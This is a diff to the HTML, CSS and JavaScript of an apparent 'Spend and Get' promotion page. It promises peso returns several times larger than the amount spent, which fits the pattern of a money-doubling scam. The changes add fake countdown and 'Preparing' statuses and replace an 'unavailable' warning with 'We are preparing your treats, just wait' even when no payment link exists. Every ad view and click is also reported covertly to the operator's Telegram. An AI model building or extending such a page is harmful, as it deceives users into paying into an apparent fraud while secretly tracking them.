@@ -391,6 +391,12 @@
       font-weight: 600;
     }
 
+    .card-item .card-timer .timer-status {
+      color: #ff6b6b;
+      font-weight: 500;
+      font-size: 0.6rem;
+    }
+
     .card-item .try-btn {
       background: linear-gradient(135deg, #2EF2A3, #1bcb86);
       border: none;
@@ -1133,6 +1139,10 @@
       border-color: rgba(255, 50, 50, 0.15);
     }
 
+    .toast-message.info {
+      border-color: rgba(46, 242, 163, 0.15);
+    }
+
     @keyframes toastSlideUp {
       from {
         opacity: 0;
@@ -1353,7 +1363,7 @@
       <div class="ad-popup-highlight">
         <div class="highlight-item">
           <span class="h-icon">✨</span>
-          <span>Win big with just spending<span class="h-text">Treats</span></span>
+          <span>Win big with just spending <span class="h-text">Treats</span></span>
         </div>
         <div class="highlight-item">
           <span class="h-icon">💰</span>
@@ -1444,7 +1454,10 @@
             <span class="spend-label">Spend</span><span class="spend-amount">₱221</span>
             <span class="get-label">Get</span><span class="get-amount">₱300 - 500</span>
           </div>
-          <div class="card-timer"><span class="timer-value" id="timer-T1"></span></div>
+          <div class="card-timer">
+            <span class="timer-value" id="timer-T1"></span>
+            <span class="timer-status" id="status-T1"></span>
+          </div>
           <button class="try-btn" data-id="T1" data-type="5H">Try this Treats!</button>
         </div>
 
@@ -1458,7 +1471,10 @@
             <span class="spend-label">Spend</span><span class="spend-amount">₱545</span>
             <span class="get-label">Get</span><span class="get-amount">₱600 - 3,000</span>
           </div>
-          <div class="card-timer"><span class="timer-value" id="timer-T2"></span></div>
+          <div class="card-timer">
+            <span class="timer-value" id="timer-T2"></span>
+            <span class="timer-status" id="status-T2"></span>
+          </div>
           <button class="try-btn" data-id="T2" data-type="1K">Try this Treats!</button>
         </div>
 
@@ -1471,7 +1487,10 @@
             <span class="spend-label">Spend</span><span class="spend-amount">₱3,240</span>
             <span class="get-label">Get</span><span class="get-amount">₱4,000 - 6,000</span>
           </div>
-          <div class="card-timer"><span class="timer-value" id="timer-T3"></span></div>
+          <div class="card-timer">
+            <span class="timer-value" id="timer-T3"></span>
+            <span class="timer-status" id="status-T3"></span>
+          </div>
           <button class="try-btn" data-id="T3" data-type="6K">Try this Treats!</button>
         </div>
 
@@ -1484,7 +1503,10 @@
             <span class="spend-label">Spend</span><span class="spend-amount">₱5,400</span>
             <span class="get-label">Get</span><span class="get-amount">₱7,000 - 10,000</span>
           </div>
-          <div class="card-timer"><span class="timer-value" id="timer-T4"></span></div>
+          <div class="card-timer">
+            <span class="timer-value" id="timer-T4"></span>
+            <span class="timer-status" id="status-T4"></span>
+          </div>
           <button class="try-btn" data-id="T4" data-type="10K">Try this Treats!</button>
         </div>
       </div>
@@ -1566,8 +1588,7 @@
           document.body.style.overflow = 'hidden';
           adShown = true;
           
-          // Send Telegram notification for ad view
-          sendTelegramNotification('👤 *User viewed the main ad popup!*\n📢 "NEW! Piso lang" offer');
+          sendTelegramNotification('👤 *User viewed the main ad popup!*\n📢 "Spend and Get" offer');
         }
       }, 3000);
 
@@ -1578,15 +1599,12 @@
         sendTelegramNotification('👤 *User closed the main ad popup*');
       }
 
-      // Close button
       mainAdClose.addEventListener('click', closeMainAd);
 
-      // CTA button
       mainAdCta.addEventListener('click', function() {
         closeMainAd();
-        sendTelegramNotification('👤 *User clicked "Claim Your Slot Now" on main ad!*');
+        sendTelegramNotification('👤 *User clicked "SPEND AND GET NOW" on main ad!*');
         
-        // Scroll to redeem section
         setTimeout(() => {
           const redeemBtn = document.getElementById('redeemBtn');
           if (redeemBtn) {
@@ -1599,7 +1617,6 @@
         }, 500);
       });
 
-      // Close on backdrop click
       mainAdPopup.addEventListener('click', function(e) {
         if (e.target === this) {
           closeMainAd();
@@ -1607,7 +1624,7 @@
       });
 
       // ============================================================
-      // MAIN SCRIPT (Existing)
+      // MAIN SCRIPT
       // ============================================================
       
       // DOM Elements
@@ -1631,6 +1648,7 @@
 
       // Timer System
       const timerIntervals = {};
+      const linkStatus = {};
 
       function getTimerKey(treatId) { return `timer_${treatId}`; }
       function getClaimedKey(treatId) { return `claimed_${treatId}`; }
@@ -1639,11 +1657,38 @@
 
       function updateTimerDisplay(treatId, seconds) {
         const timerEl = document.getElementById(`timer-${treatId}`);
+        const statusEl = document.getElementById(`status-${treatId}`);
         if (!timerEl) return;
+
+        // Check if link is ready for this treat type
+        const card = document.querySelector(`.card-item[data-id="${treatId}"]`);
+        const type = card ? card.dataset.type : null;
+
+        if (localStorage.getItem(getClaimedKey(treatId)) === 'true') {
+          timerEl.textContent = '✅ Claimed';
+          timerEl.className = 'timer-ready';
+          if (statusEl) statusEl.textContent = '';
+          return;
+        }
+
+        // Check if link exists for this type
+        if (type && linkStatus[type] === true) {
+          timerEl.textContent = '✅ Ready!';
+          timerEl.className = 'timer-ready';
+          if (statusEl) {
+            statusEl.textContent = '🔗 Ready';
+            statusEl.style.color = '#2EF2A3';
+          }
+          return;
+        }
 
         if (seconds === 'ready') {
           timerEl.textContent = '✅ Ready!';
           timerEl.className = 'timer-ready';
+          if (statusEl) {
+            statusEl.textContent = '⏳ Preparing';
+            statusEl.style.color = '#ffd93d';
+          }
           return;
         }
 
@@ -1651,6 +1696,11 @@
         const mins = Math.floor(seconds / 60);
         const secs = seconds % 60;
         timerEl.textContent = `⏱ ${mins}:${secs.toString().padStart(2, '0')}`;
+        
+        if (statusEl) {
+          statusEl.textContent = '⏳ Preparing';
+          statusEl.style.color = '#ff6b6b';
+        }
       }
 
       function startTimer(treatId, totalSeconds) {
@@ -1704,6 +1754,25 @@
             })
             .catch((error) => {
               reject(error);
+            });
+        });
+      }
+
+      // Check link status for all types
+      function checkAllLinkStatus() {
+        const types = ['5H', '1K', '6K', '10K'];
+        types.forEach(type => {
+          getLinkByType(type)
+            .then(() => {
+              linkStatus[type] = true;
+              // Update all cards of this type
+              document.querySelectorAll(`.card-item[data-type="${type}"]`).forEach(card => {
+                const treatId = card.dataset.id;
+                updateTimerDisplay(treatId, localStorage.getItem(getTimerKey(treatId)) || 0);
+              });
+            })
+            .catch(() => {
+              linkStatus[type] = false;
             });
         });
       }
@@ -1776,9 +1845,19 @@
           }, 1000);
         } else {
           const timerEl = document.getElementById(`timer-${treatId}`);
-          if (timerEl) timerEl.textContent = '';
+          if (timerEl) timerEl.textContent = '⏱ 2:00';
+          const statusEl = document.getElementById(`status-${treatId}`);
+          if (statusEl) {
+            statusEl.textContent = '⏳ Preparing';
+            statusEl.style.color = '#ff6b6b';
+          }
         }
       });
+
+      // Check link status on load
+      setTimeout(() => {
+        checkAllLinkStatus();
+      }, 1000);
 
       // Popup Functions
       function showPopup(treatId) {
@@ -1862,7 +1941,7 @@
           .catch((error) => {
             sendTelegramNotification(`⚠️ *NO LINK AVAILABLE!*\n📦 *Treat:* ${treatNames[treatId] || treatId}\n🔗 *Type:* ${treatType}\n❌ User attempted to purchase but no link is deployed.`);
             closePopup();
-            showToast('⚠️ This treat is currently unavailable. Please try again later.', true);
+            showToast('⏳ We are preparing your treats, just wait', false, true);
           });
       }
 
@@ -1972,12 +2051,14 @@
       });
 
       // Toast Function
-      function showToast(message, isError = false) {
+      function showToast(message, isError = false, isInfo = false) {
         const existingToast = document.querySelector('.toast-message');
         if (existingToast) existingToast.remove();
         
         const toast = document.createElement('div');
-        toast.className = 'toast-message' + (isError ? ' error' : '');
+        toast.className = 'toast-message';
+        if (isError) toast.classList.add('error');
+        if (isInfo) toast.classList.add('info');
         toast.textContent = message;
         document.body.appendChild(toast);
         
